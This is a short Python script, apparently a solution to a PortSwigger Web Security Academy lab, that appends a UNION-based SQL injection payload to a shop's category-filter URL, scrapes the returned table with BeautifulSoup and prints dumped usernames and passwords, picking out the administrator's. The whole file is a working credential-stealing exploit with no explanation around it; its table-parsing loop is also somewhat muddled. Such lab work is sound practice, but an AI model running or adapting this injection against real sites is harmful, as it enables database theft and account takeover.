from bs4 import BeautifulSoup
import requests

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def leak_creds():
    admin_creds = []
    url = "https://0a4200f50474d74e8077e49c00a50056.web-security-academy.net/filter?category=Lifestyle"
    sqli = url_encode("' UNION SELECT username, password FROM users--")

    payload = url + sqli

    info(payload)
    response = requests.get(payload)
    info(response.status_code)
    # info(response.text)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('th'):
        for j in soup.find_all('td'):
            temp = i.text + ':' + j.text
            if(i.text == 'administrator'):
                admin_creds.append(i.text + ":" + j.text)
            success(temp)
    
    print('--------------------------------')
    for i in admin_creds:
        success(i.split(':'))

def main():
    leak_creds()

if __name__ == "__main__":
    main()